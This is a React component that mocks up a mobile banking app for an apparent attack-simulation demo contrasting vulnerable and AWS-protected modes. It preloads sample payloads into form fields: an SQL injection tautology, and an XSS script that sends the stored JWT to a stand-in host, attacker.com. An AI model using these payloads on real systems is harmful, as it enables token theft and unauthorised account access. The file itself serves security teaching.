import React, { useState } from 'react';
import { 
  Smartphone, 
  X, 
  ArrowRightLeft, 
  ShieldCheck, 
  AlertTriangle, 
  Send, 
  Lock, 
  CheckCircle2, 
  XCircle, 
  Skull, 
  Flame, 
  Code2, 
  ShieldAlert,
  Search,
  Zap
} from 'lucide-react';

export default function MobileBankMockup({ 
  isOpen, 
  onClose, 
  onTriggerScenario,
  mode,
  activePackets = [],
  events = []
}) {
  const [activeUser, setActiveUser] = useState('cliente.a');
  const [activeAccount, setActiveAccount] = useState('cta-101');
  const [balance, setBalance] = useState(12500.00);
  
  // Selected Attack / Scenario Vector on Mobile
  // 'clean' | 'sqli' | 'bola' | 'xss' | 'trojan'
  const [selectedVector, setSelectedVector] = useState('clean');

  // Mobile Form Fields
  const [destAccount, setDestAccount] = useState('cta-202');
  const [transferAmount, setTransferAmount] = useState('1500.00');
  const [memo, setMemo] = useState('Pago de servicios legítimo');
  
  // Mobile Outcome & Transmission State
  const [outcome, setOutcome] = useState(null); // { type: 'success'|'blocked'|'breach', title, message, httpCode }
  const [isTransmitting, setIsTransmitting] = useState(false);
  const [activeTxType, setActiveTxType] = useState(null);

  // Auto-fill mobile inputs when choosing a vector
  const handleSelectVector = (vector) => {
    setSelectedVector(vector);
    setOutcome(null);
    setIsTransmitting(false);

    if (vector === 'clean') {
      setDestAccount('cta-202');
      setTransferAmount('1500.00');
      setMemo('Pago legítimo con token en 2 pasos');
    } else if (vector === 'sqli') {
      setDestAccount("cta-101' OR '1'='1' --");
      setTransferAmount('100.00');
      setMemo("SELECT * FROM accounts WHERE id = 'cta-101' OR '1'='1'");
    } else if (vector === 'bola') {
      setDestAccount('cta-202');
      setTransferAmount('500.00');
      setMemo('Consulta indebida a cuenta ajena cta-202 (Cliente B)');
    } else if (vector === 'xss') {
      setDestAccount('cta-202');
      setTransferAmount('250.00');
      setMemo("<script>fetch('http://attacker.com/steal?token='+localStorage.getItem('jwt'))</script>");
    } else if (vector === 'trojan') {
      setDestAccount('cta-MULE-999');
      setTransferAmount('11500.00');
      setMemo('Desvío forzado de fondos por troyano en background');
    }
  };

  // Monitor in-flight packet status from the simulation engine
  React.useEffect(() => {
    if (!isTransmitting || !activeTxType) return;

    // Find the active packet triggered from the client
    const livePkt = activePackets.find(
      p => p.fullPath[0] === 'client_app' && (p.typeKey === activeTxType || p.id.startsWith('PKT-'))
    );

    // Look for matching event in event history
    const matchingDrop = events.find(e => e.sourceIp === '181.174.102.45' && e.action === 'DROP');
    const matchingBreach = events.find(e => e.sourceIp === '181.174.102.45' && e.action === 'BREACH');

    if (matchingDrop || (livePkt && livePkt.state === 'dropped')) {
      setIsTransmitting(false);
      setOutcome({
        type: 'blocked',
        httpCode: matchingDrop?.httpCode || 403,
        title: '⛔ Petición Bloqueada por Seguridad',
        message: matchingDrop?.dropReason || 'Control perimetral AWS WAF / EKS descartó la solicitud por violar las políticas de seguridad.'
      });
      setActiveTxType(null);
    } else if (matchingBreach || (livePkt && livePkt.state === 'breached')) {
      setIsTransmitting(false);
      if (selectedVector === 'trojan') {
        setBalance(1000.00); // Saldo drenado
      }
      setOutcome({
        type: 'breach',
        httpCode: matchingBreach?.httpCode || 200,
        title: '⚠️ ¡Vulnerabilidad Explotada con Éxito!',
        message: matchingBreach?.dropReason || 'El servidor vulnerable procesó la petición sin validación de seguridad ni autorización.'
      });
      setActiveTxType(null);
    } else if (livePkt && livePkt.state === 'delivered') {
      setIsTransmitting(false);
      const amt = parseFloat(transferAmount) || 0;
      setBalance(prev => Math.max(0, prev - amt));
      setOutcome({
        type: 'success',
        httpCode: 200,
        title: '✅ Transferencia Completada Exitosamente',
        message: `Se debitaron Q ${amt.toFixed(2)} de la cuenta ${activeAccount} a favor de ${destAccount}. Autorización OIDC PKCE y firma KMS aplicadas.`
      });
      setActiveTxType(null);
    }
  }, [activePackets, events, isTransmitting, activeTxType, selectedVector, activeAccount, destAccount, transferAmount]);

  if (!isOpen) return null;

  const handleSendTransaction = (e) => {
    e.preventDefault();
    setOutcome(null);
    setIsTransmitting(true);

    const vectorTypeMap = {
      clean: 'LEGITIMATE_TRANSFER',
      sqli: 'ATTACK_SQLI',
      bola: 'ATTACK_BOLA',
      xss: 'ATTACK_XSS',
      trojan: 'ATTACK_BANKING_TROJAN'
    };

    const typeKey = vectorTypeMap[selectedVector] || 'LEGITIMATE_TRANSFER';
    setActiveTxType(typeKey);
    onTriggerScenario(typeKey, 'client_app');
  };

  return (
    <div className="fixed inset-y-0 right-0 z-50 w-full max-w-md bg-slate-950/95 border-l border-slate-800 shadow-2xl backdrop-blur-xl flex flex-col animate-slideLeft select-none font-mono">
      {/* Header Bar */}
      <div className="flex items-center justify-between px-5 py-3 border-b border-slate-800 bg-slate-900/90">
        <div className="flex items-center gap-2">
          <Smartphone className="w-5 h-5 text-cyan-400" />
          <div>
            <h3 className="text-xs font-bold text-white uppercase tracking-wider">
              Canal Móvil / Dispositivo Cliente (ACT-010)
            </h3>
            <span className="text-[10px] text-slate-400">Pruebas Interactivas de Inyección Directa</span>
          </div>
        </div>
        <button
          onClick={onClose}
          className="p-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition"
        >
          <X className="w-4 h-4" />
        </button>
      </div>

      {/* Screen Body */}
      <div className="flex-1 overflow-y-auto p-4 space-y-3 text-xs">
        
        {/* User Card */}
        <div className="bg-slate-900 rounded-xl p-2.5 border border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="w-7 h-7 rounded-full bg-cyan-950 border border-cyan-700/50 flex items-center justify-center text-cyan-300 font-bold text-xs">
              {activeUser === 'cliente.a' ? 'A' : 'B'}
            </div>
            <div>
              <p className="text-xs font-bold text-slate-200">
                {activeUser === 'cliente.a' ? 'Cliente A (cliente.a)' : 'Cliente B (cliente.b)'}
              </p>
              <p className="text-[9px] text-slate-400">
                {activeUser === 'cliente.a' ? 'Titular de cta-101' : 'Titular de cta-202'}
              </p>
            </div>
          </div>
          <button
            onClick={() => {
              if (activeUser === 'cliente.a') {
                setActiveUser('cliente.b');
                setActiveAccount('cta-202');
                setBalance(8100.00);
              } else {
                setActiveUser('cliente.a');
                setActiveAccount('cta-101');
                setBalance(12500.00);
              }
              setOutcome(null);
            }}
            className="px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-[10px] font-bold text-cyan-400 border border-slate-700 transition"
          >
            Cambiar Perfil
          </button>
        </div>

        {/* Balance Card */}
        <div className="rounded-xl p-3.5 bg-gradient-to-br from-slate-900 via-slate-900 to-cyan-950 border border-cyan-800/40 shadow-xl">
          <div className="flex items-center justify-between mb-1.5">
            <span className="text-[10px] font-bold text-cyan-400 tracking-wider uppercase">
              Banco Guatemalteco Digital
            </span>
            <span className="text-[9px] px-2 py-0.5 rounded bg-emerald-950/80 text-emerald-300 border border-emerald-700/40 font-bold">
              ● Saldo Disponible
            </span>
          </div>

          <h2 className="text-2xl font-bold text-white tracking-tight font-mono">
            Q {balance.toLocaleString('es-GT', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
          </h2>

          <div className="mt-2 pt-2 border-t border-slate-800 flex items-center justify-between text-[10px] text-slate-400">
            <span>Cuenta: <strong>{activeAccount}</strong></span>
            <span>Moneda: <strong>GTQ</strong></span>
          </div>
        </div>

        {/* INYECTOR DE VECTORES DE ATAQUE EN EL MÓVIL */}
        <div className="p-3 bg-slate-900/90 rounded-xl border border-slate-800 space-y-2">
          <span className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1.5">
            <Zap className="w-3.5 h-3.5 text-amber-400" />
            <span>Seleccionar Vector a Enviar desde el Teléfono:</span>
          </span>

          <div className="grid grid-cols-3 gap-1.5 pt-0.5">
            {/* 1. Seguro */}
            <button
              type="button"
              onClick={() => handleSelectVector('clean')}
              className={`p-1.5 rounded-lg border text-left transition flex flex-col gap-0.5 ${
                selectedVector === 'clean' 
                  ? 'bg-emerald-950 border-emerald-500 text-emerald-300 shadow-sm' 
                  : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
              }`}
            >
              <span className="text-[10px] font-bold flex items-center gap-1">
                <ShieldCheck className="w-3 h-3 text-emerald-400" />
                <span>Seguro</span>
              </span>
              <span className="text-[8px] text-slate-500">Normal Q 1,500</span>
            </button>

            {/* 2. SQLi */}
            <button
              type="button"
              onClick={() => handleSelectVector('sqli')}
              className={`p-1.5 rounded-lg border text-left transition flex flex-col gap-0.5 ${
                selectedVector === 'sqli' 
                  ? 'bg-rose-950 border-rose-500 text-rose-300 shadow-sm' 
                  : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-rose-300'
              }`}
            >
              <span className="text-[10px] font-bold flex items-center gap-1 text-rose-400">
                <Flame className="w-3 h-3 text-rose-400" />
                <span>Inyección SQL</span>
              </span>
              <span className="text-[8px] text-slate-500">AMZ-007</span>
            </button>

            {/* 3. BOLA */}
            <button
              type="button"
              onClick={() => handleSelectVector('bola')}
              className={`p-1.5 rounded-lg border text-left transition flex flex-col gap-0.5 ${
                selectedVector === 'bola' 
                  ? 'bg-rose-950 border-rose-500 text-rose-300 shadow-sm' 
                  : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-rose-300'
              }`}
            >
              <span className="text-[10px] font-bold flex items-center gap-1 text-rose-400">
                <Search className="w-3 h-3 text-rose-400" />
                <span>BOLA cta-202</span>
              </span>
              <span className="text-[8px] text-slate-500">AMZ-016</span>
            </button>

            {/* 4. XSS */}
            <button
              type="button"
              onClick={() => handleSelectVector('xss')}
              className={`p-1.5 rounded-lg border text-left transition flex flex-col gap-0.5 ${
                selectedVector === 'xss' 
                  ? 'bg-amber-950 border-amber-500 text-amber-300 shadow-sm' 
                  : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-amber-300'
              }`}
            >
              <span className="text-[10px] font-bold flex items-center gap-1 text-amber-400">
                <Code2 className="w-3 h-3 text-amber-400" />
                <span>Inyección XSS</span>
              </span>
              <span className="text-[8px] text-slate-500">AMZ-005</span>
            </button>

            {/* 5. Troyano */}
            <button
              type="button"
              onClick={() => handleSelectVector('trojan')}
              className={`p-1.5 rounded-lg border text-left transition flex flex-col gap-0.5 col-span-2 ${
                selectedVector === 'trojan' 
                  ? 'bg-purple-950 border-purple-500 text-purple-300 shadow-sm' 
                  : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-purple-300'
              }`}
            >
              <span className="text-[10px] font-bold flex items-center gap-1 text-purple-400">
                <Skull className="w-3 h-3 text-purple-400" />
                <span>Troyano Bancario (Desvío Q 11,500)</span>
              </span>
              <span className="text-[8px] text-slate-500">AMZ-006 / Alteración a cuenta mula</span>
            </button>
          </div>
        </div>

        {/* Transfer Form (Fields adjust based on selected payload) */}
        <form onSubmit={handleSendTransaction} className="bg-slate-900 rounded-xl p-3.5 border border-slate-800 space-y-2.5">
          <div className="flex items-center justify-between">
            <h4 className="text-xs font-bold text-slate-200 flex items-center gap-1.5">
              <ArrowRightLeft className="w-3.5 h-3.5 text-cyan-400" />
              <span>Formulario de Transferencia Móvil</span>
            </h4>
            <span className="text-[9px] text-slate-500">
              Modo: <strong className={mode === 'protected' ? 'text-emerald-400' : 'text-rose-400'}>{mode === 'protected' ? 'AWS Protegido' : 'Vulnerable'}</strong>
            </span>
          </div>

          {/* Account Origin */}
          <div>
            <label className="text-[10px] font-bold text-slate-400 block mb-1">
              Cuenta Origen:
            </label>
            <input
              type="text"
              disabled
              value={`${activeAccount} (Saldo: Q ${balance.toFixed(2)})`}
              className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1 text-xs text-slate-300 font-mono"
            />
          </div>

          {/* Destination Account (Target of SQLi / BOLA / Mule) */}
          <div>
            <label className="text-[10px] font-bold text-slate-400 block mb-1 flex items-center justify-between">
              <span>Cuenta Destino:</span>
              {selectedVector === 'sqli' && <span className="text-rose-400 text-[9px] font-bold">Inyección SQL cargada</span>}
              {selectedVector === 'bola' && <span className="text-rose-400 text-[9px] font-bold">Cuenta ajena de Cliente B</span>}
              {selectedVector === 'trojan' && <span className="text-purple-400 text-[9px] font-bold">Cuenta Mula de Atacante</span>}
            </label>
            <input
              type="text"
              value={destAccount}
              onChange={(e) => setDestAccount(e.target.value)}
              className={`w-full bg-slate-950 border rounded-lg px-2.5 py-1 text-xs font-mono focus:outline-none ${
                selectedVector !== 'clean' ? 'border-rose-600 text-rose-300 font-bold' : 'border-slate-700 text-slate-200 focus:border-cyan-500'
              }`}
              required
            />
          </div>

          {/* Transfer Amount */}
          <div>
            <label className="text-[10px] font-bold text-slate-400 block mb-1 flex items-center justify-between">
              <span>Monto a Transferir (GTQ):</span>
              {selectedVector === 'trojan' && <span className="text-purple-400 text-[9px] font-bold">Monto alterado a Q 11,500</span>}
            </label>
            <div className="relative">
              <span className="absolute left-2.5 top-1 text-xs font-bold text-slate-500 font-mono">Q</span>
              <input
                type="number"
                step="0.01"
                min="1"
                value={transferAmount}
                onChange={(e) => setTransferAmount(e.target.value)}
                className={`w-full bg-slate-950 border rounded-lg pl-6 pr-2.5 py-1 text-xs font-mono focus:outline-none ${
                  selectedVector === 'trojan' ? 'border-purple-600 text-purple-300 font-bold' : 'border-slate-700 text-slate-200 focus:border-cyan-500'
                }`}
                required
              />
            </div>
          </div>

          {/* Transfer Concept / Memo (Target of XSS) */}
          <div>
            <label className="text-[10px] font-bold text-slate-400 block mb-1 flex items-center justify-between">
              <span>Concepto / Memo:</span>
              {selectedVector === 'xss' && <span className="text-amber-400 text-[9px] font-bold">Payload XSS cargado</span>}
            </label>
            <input
              type="text"
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
              className={`w-full bg-slate-950 border rounded-lg px-2.5 py-1 text-xs font-mono focus:outline-none ${
                selectedVector === 'xss' ? 'border-amber-600 text-amber-300 font-bold' : 'border-slate-700 text-slate-200 focus:border-cyan-500'
              }`}
              required
            />
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isTransmitting}
            className={`w-full py-2 rounded-lg font-bold text-xs shadow-lg transition flex items-center justify-center gap-1.5 ${
              isTransmitting
                ? 'bg-slate-800 text-slate-400 cursor-not-allowed border border-slate-700'
                : selectedVector === 'clean'
                  ? 'bg-cyan-600 hover:bg-cyan-500 text-white shadow-cyan-950'
                  : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-950'
            }`}
          >
            {isTransmitting ? (
              <>
                <Zap className="w-3.5 h-3.5 text-cyan-400 animate-spin" />
                <span>Transmitiendo Petición...</span>
              </>
            ) : (
              <>
                <span>{selectedVector === 'clean' ? 'Enviar Operación Segura' : `Disparar ${selectedVector.toUpperCase()} desde la App`}</span>
                <Send className="w-3.5 h-3.5" />
              </>
            )}
          </button>
        </form>

        {/* Transmission in Progress Indicator */}
        {isTransmitting && (
          <div className="p-3 rounded-xl border border-cyan-500/80 bg-cyan-950/80 text-xs space-y-2 animate-pulse shadow-lg shadow-cyan-950/40">
            <div className="flex items-center gap-2 text-cyan-300 font-bold">
              <Zap className="w-4 h-4 text-cyan-400 animate-spin" />
              <span>Petición en Tránsito por la Infraestructura AWS...</span>
            </div>
            <p className="text-[11px] text-cyan-200/90 leading-tight font-mono">
              {activeTxType === 'ATTACK_SQLI' ? 'Enviando consulta SQL inyectada hacia el WAF perimetral (TB-02)...' :
               activeTxType === 'ATTACK_BOLA' ? 'Solicitando cuenta cta-202 mediante token no autorizado en EKS...' :
               activeTxType === 'ATTACK_XSS' ? 'Transmitiendo payload con script malicioso en concepto...' :
               activeTxType === 'ATTACK_BANKING_TROJAN' ? 'Troyano intentando desviar fondos a cuenta mula externa...' :
               'Transmitiendo transferencia legítima firmada por OIDC y TLS 1.3...'}
            </p>
            <div className="w-full bg-slate-900 h-1.5 rounded-full overflow-hidden border border-cyan-800">
              <div className="h-full bg-cyan-400 w-3/4 animate-pulse" />
            </div>
          </div>
        )}

        {/* Server Response Display on Mobile */}
        {outcome && !isTransmitting && (
          <div className={`p-3 rounded-xl border text-xs space-y-1.5 animate-fadeIn ${
            outcome.type === 'success' 
              ? 'bg-emerald-950/80 border-emerald-600 text-emerald-200' 
              : outcome.type === 'blocked'
                ? 'bg-rose-950/80 border-rose-600 text-rose-200'
                : 'bg-purple-950/90 border-2 border-purple-500 text-purple-200 animate-pulse'
          }`}>
            <div className="flex items-center justify-between font-bold">
              <span className="flex items-center gap-1.5">
                {outcome.type === 'success' && <CheckCircle2 className="w-4 h-4 text-emerald-400" />}
                {outcome.type === 'blocked' && <XCircle className="w-4 h-4 text-rose-400" />}
                {outcome.type === 'breach' && <AlertTriangle className="w-4 h-4 text-purple-400" />}
                <span>{outcome.title}</span>
              </span>
              <span className="px-1.5 py-0.2 rounded bg-black/40 text-[10px] font-mono font-bold">
                HTTP {outcome.httpCode}
              </span>
            </div>
            <p className="text-[11px] leading-relaxed">
              {outcome.message}
            </p>
            {outcome.type === 'breach' && (
              <button
                type="button"
                onClick={() => {
                  setBalance(12500.00);
                  setOutcome(null);
                  setSelectedVector('clean');
                  setDestAccount('cta-202');
                  setTransferAmount('1500.00');
                }}
                className="mt-1 w-full py-1 rounded bg-slate-900 hover:bg-slate-800 text-[10px] font-bold text-slate-300 border border-slate-700"
              >
                Restaurar Estado del Móvil
              </button>
            )}
          </div>
        )}

      </div>
    </div>
  );
}
